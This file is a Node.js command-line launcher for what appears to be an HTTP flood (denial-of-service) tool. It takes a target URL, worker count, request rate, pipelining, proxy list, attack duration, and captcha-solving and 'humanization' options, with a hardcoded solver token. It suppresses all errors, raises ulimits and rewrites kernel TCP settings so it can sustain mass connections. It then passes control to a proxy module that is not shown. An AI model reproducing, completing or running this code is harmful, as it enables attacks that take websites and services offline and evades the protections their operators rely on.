console.clear();
const parsedArgs = require('minimist')(process.argv.slice(2));
const execSync = require('child_process').execSync;
const events = require('events');
process.on('uncaughtException', function(e) {
    //console.log(e);
}).on('unhandledRejection', function(e) {
    //console.log(e);
}).on('warning', e => {
    //console.log(e);
}).setMaxListeners(0);
events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;

process.on('SIGINT', function() {
    console.log( "\nSIGINT (Ctrl-C)" );
    process.exit(1);
});

function parse(string, results) {
    const result = /((?:"[^"]+[^\\]")|(?:'[^']+[^\\]')|(?:[^=]+))\s*=\s*("(?:[\s\S]*?[^\\])"|'(?:[\s\S]*?[^\\])'|(?:.*?[^\\])|$)(?:;|$)(?:\s*(.*))?/m.exec(string);
    if (result && result[1]) {
        const key = result[1].trim().replace(/(^\s*["'])|(["']\s*$)/g, '').toLowerCase();
        if (typeof result[2] === "string") {
            const val = result[2].replace(/(^\s*[\\]?["'])|([\\]?["']\s*$)/g, '');
            if (val === "") {
            } else if (val.toLowerCase() === "true") {
                results[key] = true;
            } else if (val.toLowerCase() === "false") {
                results[key] = false;
            } else {
                results[key] = val;
            }
        } else {
            results[result[1].trim()] = undefined;
        }
        if (result[3] && result[3].length > 1) {
            parse(result[3], results);
        }
    }
}

function parseHeaders(text){
    const object = {};
    parse(text, object);
    return object;
}

const usage = `<target> <options>`;

if (process.argv[2] == null || parsedArgs['help'] == true) return console.log(usage);

var arguments = {
    target: process.argv[2],
    headers: parsedArgs['headers'] || 'false',
    postdata: parsedArgs['postdata'] || 'false',
    precheck: parsedArgs['precheck'] || 'false',

    humanization: parsedArgs['humanization'] || 'false',
    workers: parseInt(parsedArgs['workers']) || 15,
    delay: parseInt(parsedArgs['delay']) || 'false',
    junk: parsedArgs['junk'] || 'false',
    click: parsedArgs['click'] || 'false',

    captcha: parsedArgs['captcha'] || 'false',
    max_captchas: parseInt(parsedArgs['max_captchas']) || 15,
    token: parsedArgs['token'] || '484f6867edd89ad23af2d4cdfae8cbf5',

    mode: parsedArgs['mode'] || 'http',
    time: parseInt(parsedArgs['time']) || 'false',

    proxy: parsedArgs['proxy'] || 'Enter Proxy File',
    proxylen: parseInt(parsedArgs['proxylen']) || 'false',
    pool: parseInt(parsedArgs['pool']) || 10,
    uptime: parseInt(parsedArgs['uptime']) || 10000,

    rate: parseInt(parsedArgs['rate']) || 0,
    pipelining: parseInt(parsedArgs['pipe']) || 1,

    debug: parsedArgs['debug'] || 'false',

};

arguments.postdata = arguments.postdata == 'false' ? false : arguments.postdata;
arguments.headers = arguments.headers == 'false' ? 'false' : parseHeaders(arguments.headers);
arguments.precheck = arguments.precheck == "false" ? "https://www.google.com/" : arguments.target;

if(arguments.time !== 'false'){
    setTimeout(() => {
        process.exit(4);
    }, (arguments.time * 1000));
}

function start(args){
    console.log(args);

    execSync("ulimit -s unlimited");
    execSync("ulimit -n 999999");
    execSync("echo 15 > /proc/sys/net/ipv4/tcp_fin_timeout");
    execSync("echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse");

    return require('./misc/proxies.js')(args);
}

start(arguments);